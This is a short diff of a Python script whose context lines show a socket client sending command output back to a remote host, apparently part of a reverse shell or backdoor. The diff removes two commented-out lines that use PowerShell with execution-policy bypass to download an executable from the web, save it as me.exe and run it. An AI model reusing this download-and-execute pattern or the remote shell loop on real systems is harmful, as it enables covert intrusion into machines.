@@ -24,7 +24,5 @@ def main():
 		s.send(stdoutput)
 	s.send('adeus')
 	s.close()
-	#var = "powershell.exe -exec bypass -Command (New-Object Net.WebClient).DownloadFile('http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe','me.exe');./me.exe;"
-	#subprocess.call(['start', var], shell=True)
 if __name__ == "__main__":
 	main()	
